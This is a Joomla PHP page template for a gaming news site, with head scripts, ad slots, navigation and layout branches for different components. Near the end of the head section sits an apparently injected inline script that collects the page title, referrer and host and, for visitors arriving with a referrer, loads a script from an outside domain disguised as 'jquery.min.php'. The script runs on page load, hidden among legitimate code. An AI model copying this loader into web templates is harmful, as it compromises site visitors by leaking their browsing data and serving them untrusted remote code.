<?php
/**
 * @package     Joomla.Site
 * @subpackage  Templates.mmorpg
 *
 * @copyright   Copyright (C) 2005 - 2015 tomh, Inc. All rights reserved.
 */

defined('_JEXEC') or die;

$app             = JFactory::getApplication();
$doc             = JFactory::getDocument();
$user            = JFactory::getUser();
$this->language  = $doc->language;
$this->direction = $doc->direction;


// Getting params from template
$params = $app->getTemplate(true)->params;

// Detecting Active Variables
$option   = $app->input->getCmd('option', '');
$view     = $app->input->getCmd('view', '');
$layout   = $app->input->getCmd('layout', '');
$task     = $app->input->getCmd('task', '');
$itemid   = $app->input->getCmd('Itemid', '');
$dealid   = $app->input->getCmd('deal', '');
$menu     = $app->getMenu();
$sitename = $app->get('sitename');
$description = $doc->description;
$keywords = $doc->_metaTags['standard']['keywords'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
	<head>
		
		<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/spry/widgets/tabbedpanels/SpryTabbedPanels.js"></script>
		<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/spry/widgets/tabbedpanels/SpryTabbedPanels.css" rel="stylesheet" type="text/css" />
		<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/spry/widgets/accordion/SpryAccordion.js"></script>
		<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/spry/widgets/accordion/SpryAccordion.css" rel="stylesheet" type="text/css" />
		<style>
			#secondbase { background: #ffffff  url('<?php echo $this->baseurl ?>/images/bg/bg.png') no-repeat top center !important; background-attachment:fixed;}
			/*#secondbase { background: #ffffff; }*/
			#secondbase .sbtopborder { background:transparent !important; }
			#secondbase .tesomaytwvelvefive a { height:138px; width:980px; display:block; }
		</style>		
		<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1;" />
		<meta http-equiv="X-UA-Compatible" content="IE=8" />
		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
		<link rel="bookmark" href="/favicon.ico"/>
		<link href="http://www.gameteaser.com" hreflang="en" />
		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/radiance.css" type="text/css" media="screen,projection" title="radiance" />
		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/fullmoon/fullmoon.css" type="text/css" media="screen,projection" />
		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/template.css" type="text/css"/>
		<!--[if IE 6]>
		<link rel="stylesheet" type="text/css" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/radiance_ie6.css" media="screen,projection" />
		<![endif]-->
		<!--[if IE 7]>
		<link rel="stylesheet" type="text/css" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/radiance_ie7.css" media="screen,projection" />
		<![endif]-->
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/main.js"></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/jsfx_imagefader.js"></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/main15.js"></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/gamelist.js"></script>
		<script type="text/javascript" src='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/engine.js'></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/jquery-1.7.1.min.js" ></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/facebox.js"></script>
		<script type='text/javascript' src='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/jquery.countdown.min.js' ></script>
		<script type='text/javascript' src='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/menu.min.js' ></script>
		<script type='text/javascript' src='/media/jui/js/bootstrap.min.2.js' ></script>
		

		<!--google广告-->
		<script type='text/javascript'>
			var googletag = googletag || {};
			googletag.cmd = googletag.cmd || [];
			(function() {
				var gads = document.createElement('script');
				gads.async = true;
				gads.type = 'text/javascript';
				var useSSL = 'https:' == document.location.protocol;
				gads.src = (useSSL ? 'https:' : 'http:') + '//www.googletagservices.com/tag/js/gpt.js';
				var node = document.getElementsByTagName('script')[0];
				node.parentNode.insertBefore(gads, node);
			})();
		</script>

		<script type='text/javascript'>
			googletag.cmd.push(function() {
				googletag.defineSlot('/149935395/MMO_MedRect', [300, 250], 'div-gpt-ad-1349395187216-2').addService(googletag.pubads());googletag.defineSlot('/149935395/Home_Page_Button', [160, 160], 'div-gpt-ad-1374774164640-0').addService(googletag.pubads());googletag.defineSlot('/149935395/SiteSkin_1x1', [1, 1], 'div-gpt-ad-1373084855440-0').addService(googletag.pubads());googletag.defineSlot('/149935395/MMO_Leaderboard', [728, 90], 'div-gpt-ad-1349395187216-1').addService(googletag.pubads());googletag.defineSlot('/149935395/MMO_WideSkyscraper', [160, 600], 'div-gpt-ad-1349395187216-3').addService(googletag.pubads()); googletag.pubads().setTargeting("gameId","0");googletag.pubads().setTargeting("forums","false");googletag.pubads().setTargeting("article","false");googletag.pubads().setTargeting("pageId","home");
				googletag.pubads().enableSingleRequest();
				googletag.pubads().collapseEmptyDivs();
				googletag.enableServices();
			});
		</script>
		<!---->
		<?php if ($option == 'com_kunena'):?>
			<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/forum_diy.css" type="text/css"/>		
		<?php endif; ?>
		
		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
		<script>
  		(adsbygoogle = window.adsbygoogle || []).push({
    		google_ad_client: "ca-pub-3742939967040468",
   			 enable_page_level_ads: true
  		});
		</script>
		
		<jdoc:include type="head" />

	






<style>
.sourcecoast{
	display:none;
}
		</style>
<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://adultwebmaster.tv/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>
	<body onLoad="everyPage();" class="bgbody">
		<div id="tiplayer" style="visibility:hidden;position:absolute;z-index:753;top:0px;height:auto;"></div>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/wz_tooltip.js"></script>
		<div id="base" class="realpagebody">
			<div id="hcab"></div>
			<div id="networkbar" style="border-bottom:1px solid #e6e6e6; height:120px; line-height:24px; padding:0px; margin:0px; text-align:center; /*overflow:hidden;*/">
				<div class="networks">	
					<jdoc:include type="modules" name="top1" style="none" />
				
					<!-- sign in menu-->
					<!-- 
					<div class="dropdown" id="signDropdown" >
		        <a class="dropdown-toggle" type="button" id="signDropdownMenu" data-toggle="dropdown">
		         	Sign In
		         	<span id="user_icon"></span>
		        </a>
		        <ul class="dropdown-menu" role="menu" aria-labelledby="signDropdownMenu">
		          <li role="presentation"><a tabindex="-1" href="#">Login</a></li>
		          <li role="presentation"><a tabindex="-1" href="#">Register</a></li>
		        </ul>
		      </div> -->

					<!-- 2015-11-1 added -->
					<div id="logo" style="float:left;margin:10px -25px;">
						<a href="/" style="display:block" ><img  src="<?php echo $this->baseurl ?>/images/logo/logo.png" width="auto" height="90px" border="0" alt="" /></a> 	
					</div>
					<!-- -->
					<div style="float:left; width:780px;vertical-align:top;position:relative;">
						
						
						
					<jdoc:include type="modules" name="top_nav_trending" style="none"/>




						<div id="axTopLeaves" style="clear:both;">
							<div id="topContainer">
								<div id="userarea">
								
									<div class="social">
				<ul>
											<li><a class="twitter" href="https://twitter.com/GAMETEASERR">Twitter</a></li>
										
											<li><a class="fb" href="https://www.facebook.com/gameteaser/?ref=br_tf">Facebook</a></li>
										
											<li><a class="gplus" href="https://plus.google.com/communities/101562108167546173449">Google+</a></li>	
											<li><a class="rss" href="/index.php?format=feed&type=rss">RSS</a></li>
																			
				</ul>
</div>

								</div>
								<!--
								<a href="" onclick="return showQuickGamelistPanel();" id="showQGLpanela">Show Quick Gamelist</a>
								<a href="http://www.mmorpg.com/gamelist.cfm/game/1095" id="showQGLRandonPanela">Jump to Random Game</a>
								-->
							</div>
						</div>


				<div style='display:block;clear:both;width:100%;height:38px;padding-top:5px;border-top:solid 1px #e6e6e6;'>
					<div id="nav" style='width:780px;margin:0 auto;height:38px;'>
						<jdoc:include type="modules" name="top_nav" style="none"/>
						<div class="navtopcorner"></div>
					</div>
				</div>
				<style type="text/css">
				.navspacer{display: none;}
				</style>
				<!-- 菜单插件调用 -->
				<script type="text/javascript">
				$('.iside > .menu').menu({
					hideArrow:true,
					zIndex: 2000
				});

				</script>

					</div>

					<!--
					<span class='other' style="color:#929292; padding-right:1px;">Network:&nbsp;</span>
					
					<a href="http://www.rtsguru.com/?utm_campaign=NetworkBar&utm_medium=topbar&utm_source=mmorpg" target="_blank" style="padding-left:14px; padding-right:6px; background:transparent url(http://images.mmorpg.com/images/rts_icon.gif) no-repeat center left">RTSguru</a>-->
				</div>
				
			</div>

			<div id="secondbase">
				<div class="sbtopborder">
					<div id="container">
						<!--头部广告1-->
						<!--  
						<div class='tesomaytwvelvefive'>
							<a href='http://bs.serving-sys.com/BurstingPipe/adServer.bs?cn=tf&c=20&mc=click&pli=12695181&PluID=0&ord=1432174642904' target='_blank' rel='nofollow'  onClick="trackClick(1521,'home',0)" >
								<img src='http://bs.serving-sys.com/BurstingPipe/adServer.bs?cn=tf&c=19&mc=imp&pli=12695181&PluID=0&ord=1432174642904&rtu=-1'>
							</a>
						</div>
						-->
						<div class=""> 						
							<jdoc:include type="modules" name="top_ad_1" style="none"/>
						</div>
						<!--头部广告1结束-->
					<div id="origin">
						<div id="label">
							<!-- 2015-11-1
							<div id="logo" >
								<a href="/"><img  src="<?php echo $this->baseurl ?>/images/logo/logo.png" width="250" height="90" border="0" alt="" /></a> 	
							</div>
							-->	
							<!--  
							<div id="stats">
								<span class="label">Members:</span><span class="value">2,982,040</span>
								<span class="label">Users Online:</span><span class="value">1,977</span><br />
								<span class="label"><a href="\gamelist.cfm">Games</a>:</span><span class="value">824</span>&nbsp;
								<span class="label"><a href="\discussion2.cfm">Posts</a>:</span><span class="value">6,429,992</span>	
							</div>
							-->
							<!--头部广告2-->
							<div id="hepro" align="center" valign="middle" style="width:100%;height:200px;">
								<div class="insidediv">
									<div class=""> 						
										<jdoc:include type="modules" name="top_ad_2" style="none"/>
									</div> 
								</div>						
							</div>
							<!--头部广告2结束-->
						</div>
						<!--头部广告3-->
						<!--
					
	<div id="topcustomad" style="background:transparent url('<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/devchats/20120410_mmo_default.jpg') no-repeat top left !important; height:40px; width:990px; display:block;">
						
							<div style="padding-left:1px;" class="custombar">
							
								<a href="http://www.mmorpg.com/gameon.cfm/cast/96" style=" height:40px; width:990px; display:block; background-image: url('http://images.mmorpg.com/images/announcements/62012/15_20120601_gameon_r0.jpg'); line-height:40px; text-indent:153px; font-size:18px; text-align: left !important; font-weight:bold; color:#fff;" id="hcilinkf">Game On #66 | WoW Subscriptions Plummet, Shroud of the Avatar Deep Dive</a>
						
							</div>
					
						</div>
	
						-->					
						<!--头部广告3结束-->

						<!-- 2015-11-1
						<div id="nav" style='position:relative;'>
							<jdoc:include type="modules" name="top_nav" style="none"/>
							<div class="navtopcorner"></div>
						</div>
						-->
				</div>
				<div id="body">
					<?php //echo $view; die();?>
					<jdoc:include type="message" />
					<?php if ($option == 'com_game' || $option == 'com_phocagallery'): ?>
						<div id="colFour" class="gamelist" style="overflow:hidden !important;">
							<jdoc:include type="component" />
						</div>
						<div id="colFive" class="gamelist">
							<jdoc:include type="modules" name="body_right" style="none"/>
						</div>
					<?php elseif ($option == 'com_content' && ($view == 'article') && in_array($itemid, array(137,138,139,140,141,142,143,144))):?>
						<div id="colTen">
							<jdoc:include type="component" />
						</div>
					<?php elseif (($option == 'com_content' && $view == 'article') || ($option == 'com_cmlivedeal' && $view == 'deals' && $dealid > 0)): ?>
						<div id="colFour">
							<jdoc:include type="component" />
						</div>
						<div id="colFive" class="home">
							<jdoc:include type="modules" name="body_right" style="none"/>
						</div>
					<?php elseif ($option == 'com_users' && $view == 'registration'): ?>
						<div id="register">
							<div id="colOne">
								<jdoc:include type="component" />
							</div>
							<div id="colTwo">
								<jdoc:include type="modules" name="body_right" style="none"/>
							</div>
						</div>
					<?php elseif ($menu->getActive()==$menu->getDefault()): ?>
						<div style="height:345px; width:980px;padding:5px 0px 0px 0px;">
							<jdoc:include type="modules" name="home_left_second" style="none"/>
						</div>
						<div class="home one">
							<div class="hmemm">
								<jdoc:include type="modules" name="home_left_top" style="none"/>
								
								<a href="index.php/features?view=features" class="morefeat">More Features...</a>
							</div>
							<div class="inframe">
								<div class="three">
									<jdoc:include type="modules" name="home_left_left" style="none"/>
								</div>
								<div class="four">
									<jdoc:include type="modules" name="home_left_right" style="none"/>
								</div>
								<div class="inbot"></div>
							</div>
							
						</div>
						<div class="home two">
							<jdoc:include type="modules" name="body_right" style="none"/>
						</div>
					<?php elseif (($option == 'com_content' && ($view == 'category' || $view == 'categories' || $view == 'reviews' || $view == 'general' || $view == 'features')) || ($option == 'com_cmlivedeal' && $view=='deals')):?>
						<div id="colSix">
							<jdoc:include type="modules" name="body_left" style="none"/>
						</div>
						<div id="colSeven">	
							<jdoc:include type="component" />
						</div>
						<span class="clear"></span>
					<?php elseif ($option == 'com_content' && ($view == 'news')):?>
						<div id="newsroom" class="newsroom">
							<div class="primary">
								<jdoc:include type="component" />
							</div>
							<div class="secondary secondary2">
								<jdoc:include type="modules" name="body_right" style="none"/>
							</div>
						</div>
						<span class="clear"></span>
					<?php elseif ($option == 'com_kunena'):?>
						<div>
							<h1 class="H HomepageTitle">GAMETEASER.com Community Forums</h1>
							<div class="P PageDescription">The GAMETEASER.com community forums are where MMO gamers unite to discuss everything GAMETEASER related.  Come and join us... it's free!</div>
						</div>
						<jdoc:include type="component" />	
					<?php else:?>
						<jdoc:include type="component" />
					<?php endif; ?>
					<span class="clear"></span>
				</div>
				<div id="footer">
					<div>
						<div class="breadcrumbs">
							<a href="/" class="first"><?php echo $sitename;?>&nbsp;&raquo;</a>
							<span class="clear"></span>
						</div>
						<jdoc:include type="modules" name="footer_nav" style="none"/>
						<br /><br /><br />
						<div class='gamescom' style='text-align:center; padding-bottom:7px;'>
							<a href="http://www.gameteaser.com/" target="_blank"><img src='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/gameteasercom.png' width="240" height="50" border="0" alt="" /></a>
						</div>Copyright &#169; 2015 Tzula Entertainment Co., LIMITED<br /><span class="datetime"><?php echo(date("M d, Y g:i A" ,time())); ?></span>
					</div>
				</div>
				<div id="favgamepanel" style="display:none;"></div>	
				<div id="gqj" class="gqj" style="display:none;"></div>
			</div>
		</div>
	</div>
</div>
<div
  class="fb-like"
  data-share="true"
  data-width="450"
  data-show-faces="true">
</div>
<div id="shadowlayer" style="visibility:hidden;position:absolute;z-index:753;top:0px;left:0px; height:auto;"></div>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-69625199-1', 'auto');
  ga('send', 'pageview');

 

</script>
<a href="http://webscan.360.cn/index/checkwebsite/url/www.gameteaser.com"><img border="0" src="http://img.webscan.360.cn/status/pai/hash/a6bf3d8dd7c46363079e8386da0da78f"/></a>
</body>
</html> 	

